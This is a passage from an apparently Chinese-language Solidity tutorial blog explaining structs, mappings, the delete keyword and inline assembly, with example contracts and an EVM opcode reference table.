only</span></span><br><span class="line">        <span class="comment">// use literals, you have to provide at least one type.</span></span><br><span class="line">        arrayOfPairs[<span class="number">0</span>] = [uint(<span class="number">1</span>), <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create a dynamic byte array:</span></span><br><span class="line">        bytes memory b = <span class="keyword">new</span> bytes(<span class="number">200</span>);</span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; b.length; i++)</span><br><span class="line">            b[i] = byte(uint8(i));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>结构(struct)  </li>
</ul>
<p>&emsp;&emsp;Solidity提供了一种声明新的类型的方法，即struct。struct与C/C++一样，用法如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.11</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract CrowdFunding &#123;</span><br><span class="line">    <span class="comment">// Defines a new type with two fields.</span></span><br><span class="line">    struct Funder &#123;</span><br><span class="line">        address addr;</span><br><span class="line">        uint amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    struct Campaign &#123;</span><br><span class="line">        address payable beneficiary;</span><br><span class="line">        uint fundingGoal;</span><br><span class="line">        uint numFunders;</span><br><span class="line">        uint amount;</span><br><span class="line">        mapping (<span class="function"><span class="params">uint</span> =&gt;</span> Funder) funders;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint numCampaigns;</span><br><span class="line">    mapping (<span class="function"><span class="params">uint</span> =&gt;</span> Campaign) campaigns;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">newCampaign</span>(<span class="params">address payable beneficiary, uint goal</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint campaignID</span>) </span>&#123;</span><br><span class="line">        campaignID = numCampaigns++; <span class="comment">// campaignID is return variable</span></span><br><span class="line">        <span class="comment">// Creates new struct in memory and copies it to storage.</span></span><br><span class="line">        <span class="comment">// We leave out the mapping type, because it is not valid in memory.</span></span><br><span class="line">        <span class="comment">// If structs are copied (even from storage to storage), mapping types</span></span><br><span class="line">        <span class="comment">// are always omitted, because they cannot be enumerated.</span></span><br><span class="line">        campaigns[campaignID] = Campaign(beneficiary, goal, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contribute</span>(<span class="params">uint campaignID</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        Campaign storage c = campaigns[campaignID];</span><br><span class="line">        <span class="comment">// Creates a new temporary memory struct, initialised with the given values</span></span><br><span class="line">        <span class="comment">// and copies it over to storage.</span></span><br><span class="line">        <span class="comment">// Note that you can also use Funder(msg.sender, msg.value) to initialise.</span></span><br><span class="line">        c.funders[c.numFunders++] = Funder(&#123;<span class="attr">addr</span>: msg.sender, <span class="attr">amount</span>: msg.value&#125;);</span><br><span class="line">        c.amount += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkGoalReached</span>(<span class="params">uint campaignID</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool reached</span>) </span>&#123;</span><br><span class="line">        Campaign storage c = campaigns[campaignID];</span><br><span class="line">        <span class="keyword">if</span> (c.amount &lt; c.fundingGoal)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        uint amount = c.amount;</span><br><span class="line">        c.amount = <span class="number">0</span>;</span><br><span class="line">        c.beneficiary.transfer(amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;该合同不提供众筹合同的全部功能，但它包含理解结构所必需的基本概念。结构可被用于映射(mapping)或者数组(array)类型，并且结构也可以包含映射与数组。  </p>
<p>&emsp;&emsp;与C++类似，结构不可包含其自身成员对象，这个限制是必须的，否则无线递归将导致该类型的内存无限大。  </p>
<blockquote>
<p>注意：  </p>
<blockquote>
<p>在函数中，把state结构类型变量赋值给一个局部storage类型变量时，并不会复制该对象，而仅仅将一个引用赋值给该局部变量，所以该局部变量可以写入state变量。</p>
</blockquote>
</blockquote>
<p>&emsp;&emsp;当然，在函数中你可以直接访问一个结构对象的成员，而不必将其再次赋值给一个局部变量，因为Solidity为其创建了getter。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">campaigns[campaignID].amount = <span class="number">0</span></span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>映射(Mapping)  </li>
</ul>
<p>&emsp;&emsp;映射与python中的字典类似但意义不同，其声明的语法如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mapping(<span class="function"><span class="params">_KeyType</span> =&gt;</span> _ValueType)</span><br><span class="line"></span><br><span class="line"><span class="comment">//_KeyType可以是任意初等型</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这意味着_KeyType可以是任何内置值类型加上bytes和string类型，但是不能被定义为复杂类型(contract types, enums, mappings, structs 以及除了bytes与string之外的所有array类型)._ValueType则可以为任意类型，包括映射。  </p>
<p>&emsp;&emsp;你可以将映射理解为哈希表(Hash Table)，Key的值不储存在映射中，我们只用他的<code>keccak256</code>来进行索引。  </p>
<blockquote>
<p>因此，映射没有要设置的键或值的长度或概念。  </p>
</blockquote>
<p>&emsp;&emsp;映射类型具有storage的数据储存类型，因此他允许作为状态变量，或者作为storage的引用在函数中存在，或者作为library函数的参数。但是他们不能用于public函数的返回值或者参数。  </p>
<p>&emsp;&emsp;你可以将映射标记为public类型，并且Solidity为他创建了一个getter()接口，_KeyType将作为getter()的参数，如果_ValueType是值类型或者结构类型，那么getter将直接返回该对象，如果_ValueType是数组或映射，那么getter将返回一个包含所有_KeyType的变量，这将可以递归下去。 实例如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract MappingExample &#123;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">uint newBalance</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] = newBalance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MappingUser &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        MappingExample m = <span class="keyword">new</span> MappingExample();</span><br><span class="line">        m.update(<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">return</span> m.balances(address(<span class="keyword">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>映射类型是不可迭代的，但是你可以用他实现数据结构。    </p>
</blockquote>
<hr>
<ul>
<li>delete  </li>
</ul>
<p>&emsp;&emsp;Solidity的delete与其他语言有所不同，这里的delete是将一个对象清零，你甚至可以用他来进行变量声明，<code>delete a</code>是将a初始化为0,若delete作用于动态数组则将其length变为0,若作用于静态数组则将其所有元素清零。<code>delete a[x]</code>则将清除这个单独的元素，并不会改变length和其他元素，但是这意味着数组留下了间隙，如果你打算删除数组中的元素，或许映射是更好的选择。   </p>
<p>&emsp;&emsp;若作用于结构，它将重新初始化结构。换言之，删除后a的值与声明a时的值相同，但需注意以下事项：  </p>
<blockquote>
<p>delete对映射无效，因此假如struct中含有映射对象，delete并不会递归执行。但是映射单独的键值关系可以被删除：  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> a[msg.sender];		<span class="comment">//这将是有效的</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>当对象a是一个引用时，delete将不会修改其原来的值，而是直接重置a对象本身。  </p>
</blockquote>
<p>&emsp;&emsp;用法如下：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract DeleteExample &#123;</span><br><span class="line">    uint data;</span><br><span class="line">    uint[] dataArray;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint x = data;</span><br><span class="line">        <span class="keyword">delete</span> x; <span class="comment">// sets x to 0, does not affect data</span></span><br><span class="line">        <span class="keyword">delete</span> data; <span class="comment">// sets data to 0, does not affect x</span></span><br><span class="line">        uint[] storage y = dataArray;</span><br><span class="line">        <span class="keyword">delete</span> dataArray; <span class="comment">// this sets dataArray.length to zero, but as uint[] is a complex object, also</span></span><br><span class="line">        <span class="comment">// y is affected which is an alias to the storage object</span></span><br><span class="line">        <span class="comment">// On the other hand: "delete y" is not valid, as assignments to local variables</span></span><br><span class="line">        <span class="comment">// referencing storage objects can only be made from existing storage objects.</span></span><br><span class="line">        assert(y.length == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-汇编基础-Solidity-Addembly"><a href="#3-汇编基础-Solidity-Addembly" class="headerlink" title="3. 汇编基础(Solidity Addembly)"></a>3. 汇编基础(Solidity Addembly)</h3><ul>
<li>指令集  </li>
</ul>
<p>&emsp;&emsp;首先，我们来给出Solidity的指令集，这些东西有利于理解opcodes(操作码)  </p>
<p>&emsp;&emsp;如果opcode带有参数(从栈顶获取)，那么参数将在括号内给出。注意，在非函数样式中，参数的顺序反了过来，这很容易理解，他与C语言传参方式相同。opcode如果带有 <code>-</code> 标记，那么他将不会往栈上push一个对象(即无返回值)，如果带有*标记，代表他们比较特殊，其他没有标记的instruction将会向栈上push一个对象，这将是他们的返回值。若opcode被F，H，B或者C标记，那么他们分别是出现自 <strong>Frontier, Homestead, Byzantium or Constantinople</strong>.  <strong> Constantinople </strong>仍然在计划中，所有被标记C的指令将导致无效或异常。  </p>
<p>&emsp;&emsp;在以下指令中<strong>mem[)</strong>表示从a开始但不包括b的memory字节，<strong>storage[p]</strong>表示包含在p位置的storage内容。  </p>
<blockquote>
<p>pushi与jumpdest不能被直接使用。</p>
</blockquote>
<p>&emsp;&emsp;在语法中，操作码被表示为预先定义的标识符。  </p>
<table>
<thead>
<tr>
<th style="text-align:left">指令(Instruction)</th>
<th style="text-align:center"></th>
<th style="text-align:center"></th>
<th style="text-align:left">解释(解释)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">stop</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">停止执行，等价于return(0,0)</td>
</tr>
<tr>
<td style="text-align:left">add(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x + y</td>
</tr>
<tr>
<td style="text-align:left">sub(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x - y</td>
</tr>
<tr>
<td style="text-align:left">mul(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x * y</td>
</tr>
<tr>
<td style="text-align:left">div(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x / y</td>
</tr>
<tr>
<td style="text-align:left">sdiv(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x / y, 二进制补码表示的有符号数</td>
</tr>
<tr>
<td style="text-align:left">mod(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x % y</td>
</tr>
<tr>
<td style="text-align:left">smod(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x % y, 二进制补码表示的有符号数</td>
</tr>
<tr>
<td style="text-align:left">exp(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x的y次幂</td>
</tr>
<tr>
<td style="text-align:left">not(x)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">~x, x的每位取非</td>
</tr>
<tr>
<td style="text-align:left">lt(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x &lt; y 则为1, 否则为0</td>
</tr>
<tr>
<td style="text-align:left">gt(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x &gt; y 则为1, 否则为0</td>
</tr>
<tr>
<td style="text-align:left">slt(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x &lt; y 则为1, 否则为0, 二进制补码表示的有符号数</td>
</tr>
<tr>
<td style="text-align:left">sgt(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x &gt; y 则为1, 否则为0, 二进制补码表示的有符号数</td>
</tr>
<tr>
<td style="text-align:left">eq(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x == y 则为1, 否则为0</td>
</tr>
<tr>
<td style="text-align:left">iszero(x)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">若 x == 0 则为1, 否则为0</td>
</tr>
<tr>
<td style="text-align:left">and(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">按位将x y进行and运算</td>
</tr>
<tr>
<td style="text-align:left">or(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">按位将x y进行or运算</td>
</tr>
<tr>
<td style="text-align:left">xor(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">按位将x y进行xor运算</td>
</tr>
<tr>
<td style="text-align:left">byte(x, x)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">x的第n个字节，其中最重要的字节是第0个字节</td>
</tr>
<tr>
<td style="text-align:left">shl(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">C</td>
<td style="text-align:left">将y逻辑左偏移x位</td>
</tr>
<tr>
<td style="text-align:left">sar(x, y)</td>
<td style="text-align:center"></td>
<td style="text-align:center">C</td>
<td style="text-align:left">将y逻辑右偏移x位</td>
</tr>
<tr>
<td style="text-align:left">addmod(x, y, m)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">(x + y) % m 具有任意精度的运算</td>
</tr>
<tr>
<td style="text-align:left">mulmod(x, y, m)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">(x * y) % m 具有任意精度的运算</td>
</tr>
<tr>
<td style="text-align:left">keccak256(p, n)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">keccak(mem[p…(p+n)))</td>
</tr>
<tr>
<td style="text-align:left">jump(label)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">jump到 label / code 的位置</td>
</tr>
<tr>
<td style="text-align:left">jumpi(lable, cond)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">jump到  label 若 cond 非零</td>
</tr>
<tr>
<td style="text-align:left">pc</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前代码位置</td>
</tr>
<tr>
<td style="text-align:left">pop(x)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">stack弹出一个元素</td>
</tr>
<tr>
<td style="text-align:left">dup 1 … dup 16</td>
<td style="text-align:center">*</td>
<td style="text-align:center">F</td>
<td style="text-align:left">将第n个stack的slot复制到栈顶(从顶算起)</td>
</tr>
<tr>
<td style="text-align:left">swap 1 … swap 16</td>
<td style="text-align:center">*</td>
<td style="text-align:center">F</td>
<td style="text-align:left">交换顶与栈底的第n个slot</td>
</tr>
<tr>
<td style="text-align:left">mload(p)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">mem[p…(p+32))</td>
</tr>
<tr>
<td style="text-align:left">mstore(p, v)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">mem[p…(p+32)) := v</td>
</tr>
<tr>
<td style="text-align:left">mstore8(p, v)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">mem[p] := v &amp; 0xff 只修改一个字节</td>
</tr>
<tr>
<td style="text-align:left">sload(p)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">storage[p]</td>
</tr>
<tr>
<td style="text-align:left">sstore(p, v)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">storage[p] := v</td>
</tr>
<tr>
<td style="text-align:left">msize</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">memory的大小，即最大可访问的内存索引</td>
</tr>
<tr>
<td style="text-align:left">gas</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">仍可用于执行的gas的量</td>
</tr>
<tr>
<td style="text-align:left">address</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前合约或正在执行的上下文的地址</td>
</tr>
<tr>
<td style="text-align:left">balance(a)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">地址a的账户存款,以wei表示</td>
</tr>
<tr>
<td style="text-align:left">caller</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">call的sender(不包括delegatecall)</td>
</tr>
<tr>
<td style="text-align:left">callvalue</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前发送call所发送eth的总量,以wei表示</td>
</tr>
<tr>
<td style="text-align:left">calldatasize</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">以字节表示的当前call data的大小</td>
</tr>
<tr>
<td style="text-align:left">calldatacopy(t, f, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">从calldata的f位置复制s个字节到memory的t位置</td>
</tr>
<tr>
<td style="text-align:left">extcodesize</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前合约或上下文的代码的大小</td>
</tr>
<tr>
<td style="text-align:left">extcodecopy(a, t, f, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">与codecopy(t, f, s)类似,但是是从地址a处复制</td>
</tr>
<tr>
<td style="text-align:left">returndatasize</td>
<td style="text-align:center"></td>
<td style="text-align:center">B</td>
<td style="text-align:left">上次返回值的大小</td>
</tr>
<tr>
<td style="text-align:left">returndatacopy(t, f, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">B</td>
<td style="text-align:left">将f位置的返回值复制s字节到memory的t位置</td>
</tr>
<tr>
<td style="text-align:left">extcodehash(a)</td>
<td style="text-align:center"></td>
<td style="text-align:center">C</td>
<td style="text-align:left">地址a的hash</td>
</tr>
<tr>
<td style="text-align:left">create(v, p , n)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">以mem[p…(p+n))处的代码创建一个新的合约并且发送v数量的wei,返回新地址</td>
</tr>
<tr>
<td style="text-align:left">call(g, a, v, in, insize,out, outsize)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">将mem[in…(in+insize))作为输入调用a地址的合约,提供g数量的gas,若出错则返回0(gas耗尽),成功返回1</td>
</tr>
<tr>
<td style="text-align:left">callcode(g, a, v, in, insize, out, outsize)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">与call相同,但是保留当前上下文</td>
</tr>
<tr>
<td style="text-align:left">delegatecall(g, a, in, insize, out, outsize)</td>
<td style="text-align:center"></td>
<td style="text-align:center">B</td>
<td style="text-align:left">与callcode相同,但是保持当前的caller与callvalue</td>
</tr>
<tr>
<td style="text-align:left">staticcall(g, a, in, insize, out, outsize)</td>
<td style="text-align:center"></td>
<td style="text-align:center">B</td>
<td style="text-align:left">与call(g, a, 0, in, insize, out, outsize)相同,但是不允许状态改变</td>
</tr>
<tr>
<td style="text-align:left">return(p, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">结束执行,返回mem[p…(p+s))处的数据</td>
</tr>
<tr>
<td style="text-align:left">revert(p, s)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">B</td>
<td style="text-align:left">结束执行,回滚状态的改变,返回mem[p…(p+s))处的数据</td>
</tr>
<tr>
<td style="text-align:left">selfdestruct(a)</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">结束执行,销毁当前合约,并将全部余额打入地址a</td>
</tr>
<tr>
<td style="text-align:left">invalid</td>
<td style="text-align:center">-</td>
<td style="text-align:center">F</td>
<td style="text-align:left">以无效指令结束执行</td>
</tr>
<tr>
<td style="text-align:left">origin</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">交易发送者</td>
</tr>
<tr>
<td style="text-align:left">gasprice</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">交易的gas价格</td>
</tr>
<tr>
<td style="text-align:left">blockhash(b)</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">块nr b的哈希-仅限于最近256个块,不包括当前块</td>
</tr>
<tr>
<td style="text-align:left">coinbash</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前挖矿的收益</td>
</tr>
<tr>
<td style="text-align:left">timestamp</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">以秒为单位的当前区块的时间戳,从创世纪开始算起</td>
</tr>
<tr>
<td style="text-align:left">number</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前的区块数</td>
</tr>
<tr>
<td style="text-align:left">difficulty</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前区块的困难度</td>
</tr>
<tr>
<td style="text-align:left">gaslimit</td>
<td style="text-align:center"></td>
<td style="text-align:center">F</td>
<td style="text-align:left">当前区块的gas限制</td>
</tr>
</tbody>
</table>
<ul>
<li>字面量(Literals)</li>
</ul>
<p>&emsp;&emsp;你可以直接使用十进制或者十六进制的符号作为整数常量，并且pushi指令将会自动执行，如下代码2+3的到5然后和string “abc”进行and运算。最终结果被赋值给局部变量x。string是左对齐的并且不能超过32字节。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assembly &#123; <span class="keyword">let</span> x := and(<span class="string">"abc"</span>, add(<span class="number">3</span>, <span class="number">2</span>)) &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数风格(Functional Style)</li>
</ul>
<p>&emsp;&emsp;对于opcode序列,通常很难看到某些opcode的实际参数是什么。如下例子中，3被加到当前memory的0x80的的位置。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> <span class="number">0x80</span> mload add <span class="number">0x80</span> mstore</span><br></pre></td></tr></table></figure>
<p>Solidity的内联汇编有函数风格的表示，如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstore(<span class="number">0x80</span>, add(mload(<span class="number">0x80</span>), <span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果从右到左读取代码，最终得到的常量和opcode序列完全相同，但值的结束位置要清楚得多。  </p>
<p>&emsp;&emsp;如果您关心确切的栈布局，只需注意函数或opcode的语法第一个参数将放在栈的顶部。  </p>
<ul>
<li>访问外部调用变量，函数和库  </li>
</ul>
<p>&emsp;&emsp;你可以使用Solidity变量和其他标识符的名称来访问它们。对于存储在memory位置中的变量，他们的地址而不是值将会被推送到栈上。存储在storage位置中的变量是不同的，因为它们可能不会占用完整的存储槽，所以它们的”地址”由slot和slot内的字节偏移量组成。要检索变量x指向的插槽，可以使用x_slot，并使用x_offset字节偏移量索引。  </p>
<p>&emsp;&emsp;例如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.11</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    uint b;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint x</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint r</span>) </span>&#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r := mul(x, sload(b_slot)) <span class="comment">// ignore the offset, we know it is zero</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果访问的变量的类型跨度小于256位(例如uint64、address、bytes16或byte)，则不能对不属于类型编码的位进行任何假设。尤其是，不要假设它们为零。为了安全起见，在重要的上下文中使用数据之前，请务必正确地清除数据：<code>uint32 x=f();assembly x：=and(x,0xffffffff) /*现在使用x*/</code> 清除签名类型，可以使用signextend的opcode。  </p>
<blockquote>
<p>对Label的支持从0.5.0后被移除，只能使用function或者loop，而不能使用万恶的goto。  </p>
</blockquote>
<p>&emsp;&emsp;你可以使用let关键字声明一个之在汇编内可见的局部变量，并且之在当前的代码块内可见。let指令将会新建一个栈的slot来存储变量并且代码块结束时自动移除。你需要为他提供一个初始化值，否则他默认为0。当然你可以按照更复杂的函数式来实现。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.16</span> &lt;<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">uint x</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint b</span>) </span>&#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">let</span> v := add(x, <span class="number">1</span>)</span><br><span class="line">            mstore(<span class="number">0x80</span>, v)</span><br><span class="line">            &#123;</span><br><span class="line">                <span 